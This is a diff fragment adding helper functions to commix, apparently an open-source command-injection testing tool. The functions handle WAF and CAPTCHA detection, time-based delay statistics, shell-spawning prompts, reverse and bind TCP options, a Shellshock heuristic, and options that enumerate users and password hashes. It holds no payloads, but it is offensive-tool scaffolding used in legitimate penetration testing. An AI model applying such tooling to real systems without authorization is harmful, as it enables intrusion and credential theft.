+    err_msg += "Rerun with"
+    if menu.options.codec is None:
+      err_msg += "out"
+    err_msg += " option '--codec'."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+"""
+Ignore verbatim payload reflections so they cannot trigger a false positive.
+"""
+def remove_reflected_values(html_data, payload):
+  if not payload:
+    return html_data
+  decoded_payload = _urllib.parse.unquote(payload)
+  if decoded_payload and decoded_payload in html_data:
+    if not settings.REFLECTIVE_VALUE_FOUND:
+      settings.REFLECTIVE_VALUE_FOUND = True
+      warn_msg = "The response appears to reflect the target parameter value(s). Filtering reflected content."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    html_data = html_data.replace(decoded_payload, settings.SINGLE_WHITESPACE)
+  return html_data
+
+"""
+Returns header value ignoring the letter case
+"""
+def get_header(headers, key):
+  value = None
+  for _ in (headers or {}):
+    if _.upper() == key.upper():
+      value = headers[_]
+      break
+  return value
+
+"""
+Checks regarding a recognition of generic "your ip has been blocked" messages.
+"""
+def blocked_ip(page):
+  if not settings.BLOCKED_IP_DETECTED and re.search(settings.BLOCKED_IP_REGEX, page):
+    settings.BLOCKED_IP_DETECTED = True
+    settings.WAF_ENABLED = True
+    persist_waf_finding()
+    warn_msg = "It appears the target server has blocked you."
+    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+
+"""
+Checks regarding a potential browser verification protection mechanism.
+"""
+def browser_verification(page):
+  if not settings.BROWSER_VERIFICATION and re.search(r"(?i)browser.?verification", page or ""):
+    settings.BROWSER_VERIFICATION = True
+    settings.WAF_ENABLED = True
+    persist_waf_finding()
+    warn_msg = "Potential browser verification protection mechanism detected"
+    if re.search(r"(?i)CloudFlare", page):
+      warn_msg += " (CloudFlare)."
+    else:
+      warn_msg += "."
+    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+
+"""
+Checks regarding a potential CAPTCHA protection mechanism.
+"""
+def captcha_check(page):
+  if not settings.CAPTCHA_DETECED and re.search(r"(?i)captcha", page or ""):
+    for match in re.finditer(r"(?si)<form.+?</form>", page):
+      if re.search(r"(?i)captcha", match.group(0)):
+        settings.CAPTCHA_DETECED = True
+        settings.WAF_ENABLED = True
+        persist_waf_finding()
+        warn_msg = "Potential CAPTCHA protection mechanism detected"
+        if re.search(r"(?i)<title>[^<]*CloudFlare", page):
+          warn_msg += " (CloudFlare)."
+        else:
+          warn_msg += "."
+        if settings.CRAWLING:
+          settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+        break
+
+"""
+Checking the reliability of the used payload message.
+"""
+def check_for_false_positive_result(false_positive_warning):
+  info_msg = "Identified a potential injection point on "
+  info_msg += settings.CHECKING_PARAMETER + "."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  info_msg = "Testing" + (" with a longer delay to rule out noise" if false_positive_warning else "")
+  info_msg += " if the injection point is a false positive"  
+  if settings.VERBOSITY_LEVEL != 0:
+    info_msg = info_msg + "." + settings.END_LINE.LF
+  else:
+    info_msg = info_msg +", please wait..."
+  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
+
+"""
+False positive or unexploitable injection point detected.
+"""
+def unexploitable_point(retry_attempt=None, retry_total=None):
+  if settings.VERBOSITY_LEVEL == 0:
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+  warn_msg = "Detected a false positive or unexploitable injection point. Trying for re-verification"
+  warn_msg += (" (" + str(retry_attempt) + "/" + str(retry_total) + ").") if retry_attempt else "."
+  settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+
+"""
+Counting the total of HTTP(S) requests for the identified injection point(s), during the detection phase.
+"""
+def total_of_requests():
+  debug_msg = "Identified the following injection point with "
+  debug_msg += "a total of " + str(settings.TOTAL_OF_REQUESTS) + " HTTP(S) requests."
+  settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+
+"""
+Url decode specific chars of the provided payload.
+"""
+def url_decode(payload):
+  rep = {
+          "%20": " ",
+          "%2B": "+",
+          settings.END_LINE.LF: settings.END_LINE.ESCAPED_LF
+        }
+  rep = dict((re.escape(k), v) for k, v in rep.items())
+  pattern = re.compile("|".join(rep.keys()))
+  payload = pattern.sub(lambda m: rep[re.escape(m.group(0))], payload)
+  return payload
+
+"""
+Check current assessment phase.
+"""
+def assessment_phase():
+  if settings.DETECTION_PHASE:
+    if settings.CRAWLING_PHASE:
+      return "crawling"
+    else:
+      return "detection"
+  else:
+    return "exploitation"
+
+"""
+Procced to the next attack vector.
+"""
+def next_attack_vector(technique, go_back):
+  if not settings.LOAD_SESSION:
+    while True:
+      message = "Do you want to continue testing using the " + technique + "? [y/N] "
+      next_attack_vector = common.read_input(message, default="N", check_batch=True)
+      if next_attack_vector in settings.CHOICE_YES:
+        # Check injection state
+        assessment_phase()
+        return True
+      elif next_attack_vector in settings.CHOICE_NO:
+        return  False
+      elif next_attack_vector in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(next_attack_vector)
+        pass
+
+"""
+Fix single / double quote escaping.
+"""
+def escaped_cmd(cmd):
+  if "\\\"" in cmd :
+    cmd = cmd.replace("\\\"","\"")
+  if "\'" in cmd :
+    cmd = cmd.replace("\'","'")
+  if r"\$" in cmd :
+    cmd = cmd.replace(r"\$","$")
+  return cmd
+
+"""
+Removing the first and/or last line of the html content (in case there are/is empty).
+"""
+def remove_empty_lines(content):
+  try:
+    if content[0] == settings.END_LINE.LF:
+      content = content[1:content.rfind(settings.END_LINE.LF)]
+    if content[-1] == settings.END_LINE.LF:
+      content = content[:content.rfind(settings.END_LINE.LF)]
+  except IndexError:
+    pass
+  return content
+
+"""
+Enable pseudo-terminal shell
+"""
+def enable_shell(url):
+  message = ""
+  if settings.LOAD_SESSION:
+    message = "Resumed "
+  message += settings.CHECKING_PARAMETER
+  if settings.LOAD_SESSION: 
+    message += " injection point from stored session"
+  else:
+    message += " is likely vulnerable"
+  message += ". Do you want to spawn a pseudo-terminal shell? [Y/n] "
+  if settings.CRAWLING:
+    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
+  gotshell = common.read_input(message, default="Y", check_batch=True)
+  return gotshell
+
+"""
+Check 'os_shell' options
+"""
+def check_os_shell_options(cmd, technique, go_back, no_result):
+  if cmd in settings.SHELL_OPTIONS:
+    if cmd == "?":
+      menu.os_shell_options()
+    elif cmd == "back":
+      if next_attack_vector(technique, go_back) == True:
+        return True
+      else:
+        return False
+    else:
+      return cmd
+
+"""
+Procced with file-based semiblind command injection technique,
+once the user provides the path of web server's root directory.
+"""
+def procced_with_file_based_technique():
+  while True:
+    message = "Due to the provided '--web-root' option, "
+    message += "do you want to proceed with the (semi-blind) "
+    message += "file-based injection technique? [y/N] "
+    enable_fb = common.read_input(message, default="N", check_batch=True)
+    if enable_fb in settings.CHOICE_YES:
+      return True
+    elif enable_fb in settings.CHOICE_NO:
+      return False
+    elif enable_fb in settings.CHOICE_QUIT:
+      raise SystemExit()
+    else:
+      common.invalid_option(enable_fb)
+      pass
+
+"""
+Check 'reverse_tcp' options
+"""
+def check_reverse_tcp_options(reverse_tcp_option):
+  if reverse_tcp_option == False:
+    return 0
+  elif reverse_tcp_option == "back":
+    return 1
+  elif reverse_tcp_option == "os_shell":
+    return 2
+  elif reverse_tcp_option == "bind_tcp":
+    return 3
+
+"""
+Check 'bind_tcp' options
+"""
+def check_bind_tcp_options(bind_tcp_option):
+  if bind_tcp_option == False:
+    return 0
+  elif bind_tcp_option == "back":
+    return 1
+  elif bind_tcp_option == "os_shell":
+    return 2
+  elif bind_tcp_option == "reverse_tcp":
+    return 3
+
+"""
+Ignore the error and continue testing; the choice is remembered for this code.
+"""
+def continue_tests(err):
+  # Ignoring (problematic) HTTP error codes.
+  if len(settings.IGNORE_CODE) != 0 and any(str(x) in str(err).lower() for x in settings.IGNORE_CODE):
+    return True
+
+  # Possible WAF/IPS
+  try:
+    detect_waf(err.code)
+    warn_msg = "The web server responded with an HTTP error code '" + str(err.code)
+    warn_msg += "' which could interfere with the results of the tests."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    settings.IGNORE_CODE.append(err.code)
+    return True
+  except AttributeError:
+    # No HTTP code (e.g. connection reset) - retry a bounded number of times.
+    if stability.should_retry_connection_error(err):
+      return True
+    settings.print_data_to_stdout(settings.print_critical_msg(err))
+    return False
+  except KeyboardInterrupt:
+    raise
+
+"""
+Check if option is unavailable
+"""
+def unavailable_option(check_option):
+  warn_msg = "The option '" + check_option + "' "
+  warn_msg += "is currently not supported on Windows targets."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Information message if platform does not have
+GNU 'readline' module installed.
+"""
+def no_readline_module():
+  err_msg =  "It seems your platform does "
+  err_msg += "not have GNU 'readline' module installed."
+  err_msg += " Download the"
+  if settings.IS_WINDOWS:
+    err_msg += " 'pyreadline' package (https://pypi.python.org/pypi/pyreadline) or the 'pyreadline3' package (https://pypi.python.org/pypi/pyreadline3) instead."
+  elif settings.PLATFORM == "mac":
+    err_msg += " 'gnureadline' package (https://pypi.python.org/pypi/gnureadline)."
+  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+
+"""
+Check for incompatible OS (i.e Unix).
+"""
+def ps_incompatible_os():
+  if not settings.TARGET_OS == settings.OS.WINDOWS:
+    warn_msg = "The identified OS seems incompatible with the provided '--ps-version' switch."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    return True
+
+"""
+Check if PowerShell is enabled.
+"""
+def ps_check():
+  if settings.PS_ENABLED == None and menu.options.is_admin or menu.options.users or menu.options.passwords:
+    if settings.VERBOSITY_LEVEL != 0:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    while True:
+      message = "Some payloads in the selected options require PowerShell. "
+      message += "Do you want to use the '--ps-version' flag "
+      message += "to ensure it is enabled? [Y/n] "
+      ps_check = common.read_input(message, default="Y", check_batch=True)
+      if ps_check in settings.CHOICE_YES:
+        menu.options.ps_version = True
+        break
+      elif ps_check in settings.CHOICE_NO:
+        break
+      elif ps_check in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(ps_check)
+        pass
+
+"""
+If PowerShell is disabled.
+"""
+def ps_check_failed():
+  while True:
+    message = "Do you want to proceed despite the above warning? [Y/n] "
+    ps_check = common.read_input(message, default="Y", check_batch=True)
+    if ps_check in settings.CHOICE_YES:
+      break
+    elif ps_check in settings.CHOICE_NO:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      os._exit(0)
+    else:
+      common.invalid_option(ps_check)
+      pass
+
+"""
+Perform basic heuristic checks for CGI scripts potentially vulnerable to Shellshock.
+"""
+def check_CGI_scripts(url):
+
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "Checking target URL for potentially vulnerable CGI scripts."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+
+  CGI_SCRIPTS = common.load_list_from_file(settings.CGI_SCRIPTS, "CGI scripts list")
+
+  _ = False
+  for cgi_script in CGI_SCRIPTS:
+    if cgi_script in url:
+      info_msg = "Heuristic (basic) tests show that target URL might be vulnerable to Shellshock "
+      info_msg += "(detected script: '" + cgi_script + "')."
+      _ = True
+      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+      while True:
+        message = "Do you want to enable the Shellshock module ('--shellshock')? [Y/n] "
+        shellshock_check = common.read_input(message, default="Y", check_batch=True)
+        if shellshock_check in settings.CHOICE_YES:
+          menu.options.shellshock = True
+          return
+        elif shellshock_check in settings.CHOICE_NO:
+          menu.options.shellshock = False
+          return
+        elif shellshock_check in settings.CHOICE_QUIT:
+          raise SystemExit()
+        else:
+          common.invalid_option(shellshock_check)
+          pass
+
+  if not _:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "No potentially vulnerable CGI scripts detected in target URL."
+      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+    menu.options.shellshock = False
+
+"""
+Safely parse a target URL into components.
+"""
+def check_url(url):
+  try:
+    return _urllib.parse.urlsplit(url)
+  except ValueError as ex:
+    err_msg = "Invalid target URL provided. "
+    err_msg += "Please ensure there are no leftover characters (e.g., '[' or ']') "
+    err_msg += "in the hostname part."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+"""
+Verify whether the URL scheme is HTTP or HTTPS.
+"""
+def check_http_s(url):
+  url_split = check_url(url)
+  if url_split.username and url_split.password and "@" in url_split.netloc:
+    url = url.replace(url_split.netloc,url_split.netloc.split("@")[1])
+ 
+  if settings.SINGLE_WHITESPACE in url:
+    url = url.replace(settings.SINGLE_WHITESPACE, _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE))
+
+  if not menu.options.proxy and (_urllib.parse.urlparse(url).hostname in ("localhost", "127.0.0.1") or menu.options.ignore_proxy):
+    menu.options.ignore_proxy = True
+
+  if settings.CHECK_INTERNET:
+      url = settings.CHECK_INTERNET_ADDRESS
+  else:
+    if re.search(r'^(?:http)s?://', url, re.I):
+      if not re.search(r"^(http|ws)s?://", url, re.I):
+        if re.search(r":443\b", url):
+          url = "https://" + url
+        else:
+          url = "http://" + url
+      settings.SCHEME = (url_split.scheme.strip().lower() or "http") if not menu.options.force_ssl else "https"
+    else:
+      err_msg = "Invalid target URL provided. "
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+
+  if _urllib.parse.urlparse(url).scheme != settings.SCHEME:
+    if menu.options.force_ssl and settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Forcing usage of SSL/HTTPS requests."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    url = url.replace(_urllib.parse.urlparse(url).scheme, settings.SCHEME)
+
+  return url
+
+"""
+Checking connection (resolving hostname).
+"""
+def check_connection(url):
+  hostname = _urllib.parse.urlparse(url).hostname or ''
+  if not re.search(r"\A\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\Z", hostname):
+    if not any((menu.options.proxy, menu.options.tor, menu.options.offline)):
+      try:
+        if settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Resolving hostname '" + hostname + "'."
+          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+        socket.getaddrinfo(hostname, None)
+      except socket.gaierror:
+        err_msg = "Host '" + hostname + "' does not exist."
+        if not settings.MULTI_TARGETS:
+          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+          raise SystemExit()
+      except (socket.error, UnicodeError) as e:
+        err_msg = "Problem occurred while "
+        err_msg += "resolving the hostname '" + hostname + "'"
+        if not settings.MULTI_TARGETS:
+          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+          raise SystemExit()
+
+"""
+Force the user-defined operating system.
+"""
+def user_defined_os():
+  if menu.options.os:
+    if menu.options.os.lower() == "windows":
+      settings.TARGET_OS = settings.OS.WINDOWS
+      return True
+    elif menu.options.os.lower() == "unix":
+      return True
+    else:
+      err_msg = "You defined an invalid value '" + menu.options.os + "' "
+      err_msg += "for the operating system. The value must be 'Windows' or 'Unix'."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+
+"""
+Define the target operating system.
+"""
+def define_target_os():
+  # If "--shellshock" option is provided then, by default is a Linux/Unix operating system.
+  if menu.options.shellshock:
+    return
+  else:
+    while True:
+      message = "Do you recognize the server's underlying operating system? "
+      message += "[(N)o/(u)nix-like/(w)indows/(q)uit] "
+      got_os = common.read_input(message, default="N", check_batch=True)
+      if got_os.lower() in settings.CHOICE_OS :
+        if got_os.lower() == "u":
+          return
+        elif got_os.lower() == "w":
+          settings.TARGET_OS = settings.OS.WINDOWS
+          return
+        elif got_os.lower() == "n":
+          settings.CHECK_BOTH_OS = True
+
+          return
+        elif got_os.lower() == "q":
+          raise SystemExit()
+      else:
+        common.invalid_option(got_os)
+        pass
+
+"""
+Decision if the user-defined operating system name,
+is different than the one identified by heuristics.
+"""
+def identified_os():
+    if settings.IGNORE_IDENTIFIED_TARGET_OS == None:
+      warn_msg = "Identified a different operating system (i.e. '"
+      warn_msg += settings.TARGET_OS.title() + "') than the one you defined (i.e. '" + menu.options.os.title() + "')."
+      settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+      message = "How do you want to proceed? [(C)ontinue/(s)kip] "
+      while True:
+        proceed_option = (common.read_input(message, default="S", check_batch=True) or "S").strip().lower()
+        if proceed_option in ("c", "s", "q"):
+          break
+        common.invalid_option(proceed_option)
+      if proceed_option == "c":
+        settings.IGNORE_IDENTIFIED_TARGET_OS = True
+        return settings.IGNORE_IDENTIFIED_TARGET_OS
+      elif proceed_option == "s":
+        settings.IGNORE_IDENTIFIED_TARGET_OS = False
+        return settings.IGNORE_IDENTIFIED_TARGET_OS
+      elif proceed_option == "q":
+        raise SystemExit()
+
+"""
+Checking for all required third-party library dependencies.
+"""
+def third_party_dependencies():
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "Checking for all required third-party library dependencies."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+
+  try:
+    import sqlite3
+  except ImportError:
+    err_msg = settings.APPLICATION + " requires 'sqlite3' third-party library "
+    err_msg += "to store previous injection points and commands. "
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+  try:
+    import readline
+  except (ImportError, AttributeError):
+    if settings.IS_WINDOWS:
+      try:
+        import pyreadline
+      except ImportError:
+        err_msg = "TAB completion and history support features require "
+        err_msg += "the 'pyreadline' (third-party) library."
+        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    elif settings.PLATFORM == "posix":
+      try:
+        import gnureadline
+      except ImportError:
+        err_msg = "TAB completion and history support features require "
+        err_msg += "the 'gnureadline' (third-party) library."
+        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    pass
+
+"""
+Print the authentiation error message.
+"""
+def http_auth_err_msg():
+  err_msg = "Use the '--auth-cred' option to provide a valid pair of "
+  err_msg += "HTTP authentication credentials (e.g., --auth-cred=\"admin:admin\"), "
+  err_msg += "or use the '--ignore-code=401' option to ignore HTTP error 401 (Unauthorized) "
+  err_msg += "and continue tests without providing valid credentials."
+  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+  raise SystemExit()
+
+"""
+Error while accessing session file
+"""
+def error_loading_session_file():
+  err_msg = "An error occurred while accessing session file ('"
+  err_msg += settings.SESSION_FILE + "'). "
+  err_msg += "Use the '--flush-session' option."
+  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+  raise SystemExit()
+
+"""
+EOFError
+"""
+def EOFError_err_msg():
+  if settings.STDIN_PARSING:
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+  err_msg = "Exiting, due to EOFError."
+  settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+
+"""
+Message regarding unexpected time delays due to unstable requests
+"""
+def time_delay_due_to_unstable_request(timesec):
+  # Already answered this run - reapply it instead of asking again.
+  if settings.UNSTABLE_REQUEST_CHOICE:
+    if settings.UNSTABLE_REQUEST_CHOICE == "c" and settings.UNSTABLE_REQUEST_BUMPS < settings.MAX_UNSTABLE_TIMESEC_BUMP:
+      timesec = timesec + 1
+      settings.UNSTABLE_REQUEST_BUMPS = settings.UNSTABLE_REQUEST_BUMPS + 1
+    return timesec, settings.UNSTABLE_REQUEST_CHOICE == "c"
+
+  message = "Unexpected time delays have been identified."
+  settings.print_data_to_stdout(settings.END_LINE.CR)
+  while True:
+    message = message + " How do you want to proceed? [(C)ontinue with a longer delay/(s)kip this candidate and try the next] "
+    proceed_option = common.read_input(message, default="C", check_batch=True)
+    if proceed_option.lower() in settings.CHOICE_PROCEED :
+      if proceed_option.lower() == "c":
+        settings.UNSTABLE_REQUEST_CHOICE = "c"
+        settings.UNSTABLE_REQUEST_BUMPS = 1
+        timesec = timesec + 1
+        false_positive_fixation = True
+        return timesec, false_positive_fixation
+      elif proceed_option.lower() == "s":
+        settings.UNSTABLE_REQUEST_CHOICE = "s"
+        false_positive_fixation = False
+        return timesec, false_positive_fixation
+      elif proceed_option.lower() == "q":
+        raise SystemExit()
+    else:
+      common.invalid_option(proceed_option)
+      pass
+
+"""
+True only for a genuinely finished stored value - a partial (interrupted-run) marker isn't a result yet, and must be treated the same as "nothing stored" so the caller re-runs (and thereby resumes) it instead of handing back the raw marker.
+"""
+def usable_stored_cmd(stored_value):
+  return stored_value is not None and not stored_value.startswith(settings.PARTIAL_VALUE_MARKER)
+
+"""
+Drop high-latency spikes from a response-time sample via a median/MAD cutoff.
+"""
+def strip_time_outliers(values):
+  if not values or len(values) < settings.MIN_TIME_RESPONSES // 2:
+    return values
+  ordered = sorted(values)
+  median = ordered[len(ordered) // 2]
+  mad = sorted(abs(value - median) for value in values)[len(values) // 2]
+  if mad <= 0:
+    return values
+  cutoff = median + settings.TIME_OUTLIER_MAD_COEFF * 1.4826 * mad
+  result = [value for value in values if value <= cutoff]
+  return result if len(result) >= max(settings.MIN_TIME_RESPONSES // 2, len(values) // 2) else values
+
+"""
+Feed a genuinely non-delayed response time into the rolling baseline model.
+"""
+def record_baseline_response_time(exec_time):
+  settings.RESPONSE_TIMES.append(exec_time)
+  if len(settings.RESPONSE_TIMES) > settings.MAX_TIME_RESPONSES:
+    settings.RESPONSE_TIMES[:] = settings.RESPONSE_TIMES[-(settings.MAX_TIME_RESPONSES // 2):]
+
+"""
+Blocking warm-up: fills the response-time model to MIN_TIME_RESPONSES before the first real timing comparison, instead of running that decision on a thin or empty model.
+"""
+def warm_up_response_baseline(url, http_request_method):
+  if len(settings.RESPONSE_TIMES) >= settings.MIN_TIME_RESPONSES:
+    return
+  info_msg = "Time-related response comparison requires a larger statistical model"
+  info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
+  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
+  while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
+    sample = requests.quick_response_time_sample(url, http_request_method)
+    if sample is not None:
+      record_baseline_response_time(sample)
+    if settings.VERBOSITY_LEVEL == 0:
+      settings.print_data_to_stdout(".")
+  if settings.VERBOSITY_LEVEL == 0:
+    settings.print_data_to_stdout(" (done)")
+    settings.close_progress_line()
+
+"""
+Warns once (whichever call site reaches it first) if the connection is already too jittery to trust automatically, and disables timesec auto-shrinking for the rest of the run. Returns True if lagging is (or was already found to be) detected.
+"""
+def check_lagging():
+  if not settings.LAGGING_CHECKED:
+    settings.LAGGING_CHECKED = True
+    if len(settings.RESPONSE_TIMES) > 1 and statistics.pstdev(settings.RESPONSE_TIMES) > settings.WARN_TIME_STDEV:
+      settings.LAGGING_DETECTED = settings.JITTER_SEEN = settings.ADJUST_TIME_DELAY_DISABLED = True
+      warn_msg = "Detected considerable lagging in the connection response(s). "
+      warn_msg += "Consider using a higher '--time-sec' value (e.g. 10 or more)."
+      settings.print_data_to_stdout(settings.print_critical_msg(warn_msg))
+  return settings.LAGGING_DETECTED
+
+"""
+Current adaptive delay threshold (mean + N*stdev of the baseline), or None if there's no data to compute a deviation from yet.
+"""
+def current_delay_threshold():
+  sample = strip_time_outliers(settings.RESPONSE_TIMES)
+  if len(sample) < 2:
+    return None
+  deviation = statistics.pstdev(sample)
+  if not deviation:
+    return None
+  if len(sample) < settings.MIN_TIME_RESPONSES and settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "Time-based standard deviation method used on a model with less than " + str(settings.MIN_TIME_RESPONSES) + " response times."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+  return max(settings.MIN_VALID_DELAYED_RESPONSE, statistics.mean(sample) + settings.TIME_STDEV_COEFF * deviation)
+
+"""
+Time related shell condition. Uses the adaptive threshold once available, else a fixed one.
+"""
+def time_related_shell(url_time_response, exec_time, timesec):
+  lower_limit = current_delay_threshold()
+  delayed = exec_time >= lower_limit if lower_limit is not None else exec_time >= timesec
+
+  # Prompt once on the first delayed exploitation response; use the same gate for delay adjustments.
+  if delayed and settings.EXPLOITATION_PHASE and settings.ADJUST_TIME_DELAY_CHOICE is None:
+    msg = "Do you want commix to try to optimize the value(s) for delay responses (option '--time-sec')? [Y/n] "
+    settings.ADJUST_TIME_DELAY_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES
+
+  return delayed
+
+"""
+Message regarding time related attcks
+"""
+def time_related_attaks_msg():
+  if not settings.TIME_RELATED_ATTACK_WARNING:
+    warn_msg = "Excessive network load may affect the reliability of time-related payloads."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+  settings.TIME_RELATED_ATTACK_WARNING = True
+
+"""
+Check if defined "--url-reload" option.
+"""
+def reload_url_msg(technique):
+  warn_msg = "On the " + technique + " technique, the '--url-reload' option is not available."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Decision if the user-defined HTTP authenticatiob type,
+is different than the one identified by heuristics.
+"""
+def identified_http_auth_type(auth_type):
+  warn_msg = "Identified different HTTP authentication type ("
+  warn_msg += auth_type.lower() + ") than that you have provided ("
+  warn_msg += menu.options.auth_type + ")."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+  message = "How do you want to proceed? [(C)ontinue/(s)kip] "
+  while True:
+    proceed_option = (common.read_input(message, default="C", check_batch=True) or "C").strip().lower()
+    if proceed_option in ("c", "s", "q"):
+      break
+    common.invalid_option(proceed_option)
+  if proceed_option == "s":
+    return False
+  elif proceed_option == "c":
+    return True
+  elif proceed_option == "q":
+    raise SystemExit()
+
+"""
+Retrieve everything from the supported enumeration options.
+"""
+def enable_all_enumeration_options():
+  # Retrieve current user name.
+  menu.options.current_user = True
+  # Retrieve current hostname.
+  menu.options.hostname = True
+  # Retrieve system information.
+  menu.options.sys_info = True
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Check if the current user have admin privileges.
+    menu.options.is_admin = True
+    # Retrieve PowerShell's version number.
+    menu.options.ps_version = True
+  else:
+    # Check if the current user have root privileges.
+    menu.options.is_root = True
+  # Retrieve system users.
+  menu.options.users = True
+  # Retrieve system users privileges.
+  menu.options.privileges = True
+  # Retrieve system users password hashes.
+  menu.options.passwords = True
+
+"""
+Check provided parameters for tests
+"""
+def check_provided_parameters():
+
+  if menu.options.test_parameter or menu.options.skip_parameter:
+    if menu.options.test_parameter != None :
+      if menu.options.test_parameter.startswith("="):
+        menu.options.test_parameter = menu.options.test_parameter[1:]
+      settings.TESTABLE_PARAMETERS_LIST = menu.options.test_parameter.split(settings.PARAMETER_SPLITTING_REGEX)
+
+    elif menu.options.skip_parameter != None :
+      if menu.options.skip_parameter.startswith("="):
+        menu.options.skip_parameter = menu.options.skip_parameter[1:]
+      settings.TESTABLE_PARAMETERS_LIST = menu.options.skip_parameter.split(settings.PARAMETER_SPLITTING_REGEX)
+
+    for i in range(0,len(settings.TESTABLE_PARAMETERS_LIST)):
+      if "=" in settings.TESTABLE_PARAMETERS_LIST[i]:
+        settings.TESTABLE_PARAMETERS_LIST[i] = settings.TESTABLE_PARAMETERS_LIST[i].split("=")[0]
+
+"""
+Remove skipped parameters
+"""
+def remove_skipped_params(url, check_parameters):
+  testable_parameters = list(set(check_parameters) - set(menu.options.skip_parameter.split(",")))
+  settings.TESTABLE_PARAMETERS_LIST = [x for x in testable_parameters if x not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX)]
+  _ = []
+  for parameter in check_parameters:
+    if parameter not in settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST).split(settings.PARAMETER_SPLITTING_REGEX):
+      _.append(parameter)
+  if _:    
+    info_msg = "Skipping " + check_http_method(url) + " parameter" + ('', 's')[len(_) > 1] + " '" + str(", ".join(_)) + "'."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  menu.options.test_parameter = True
+
+"""
+Identify and print non-listed parameters that were provided but not part of the testable list.
+"""
+def testable_parameters(url, check_parameters, header_name):
+  # Skip parameters if requested
+  if menu.options.skip_parameter is not None:
+    remove_skipped_params(url, check_parameters)
+
+  if isinstance(settings.TESTABLE_PARAMETERS_LIST, list) and settings.TESTABLE_PARAMETERS_LIST:
+    raw_params = settings.PARAMETER_SPLITTING_REGEX.join(settings.TESTABLE_PARAMETERS_LIST)
+    normalized_params = raw_params.replace(settings.SINGLE_WHITESPACE, "")
+    testable_params = normalized_params.split(settings.PARAMETER_SPLITTING_REGEX)
+
+    non_listed_params = list(set(testable_params) - set(check_parameters))
+
+    # Determine testable state
+    settings.TESTABLE_PARAMETERS = bool(
+      settings.TESTABLE_PARAMETERS or 
+      any(p in check_parameters for p in settings.TESTABLE_PARAMETERS_LIST)
+    )
+
+    if non_listed_params:
+      normalized_non_exist = settings.PARAMETER_SPLITTING_REGEX.join(non_listed_params)
+      normalized_non_exist = normalized_non_exist.replace(settings.SINGLE_WHITESPACE, "")
+      non_listed_params = normalized_non_exist.split(settings.PARAMETER_SPLITTING_REGEX)
+
+      http_method = check_http_method(url)
+      if non_listed_params and http_method not in settings.METHODS_WITH_NON_LISTED_PARAMS:
+        settings.METHODS_WITH_NON_LISTED_PARAMS.append(http_method)
+        non_listed_params_items = ", ".join(non_listed_params)
+        warn_msg = "Provided parameter" + ("s" if len(non_listed_params) != 1 else "") + " '"
+        warn_msg += non_listed_params_items + "'" + (" are", " is")[len(non_listed_params) == 1]
+        warn_msg += " not inside the " + http_method + "."
+        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+        
+"""
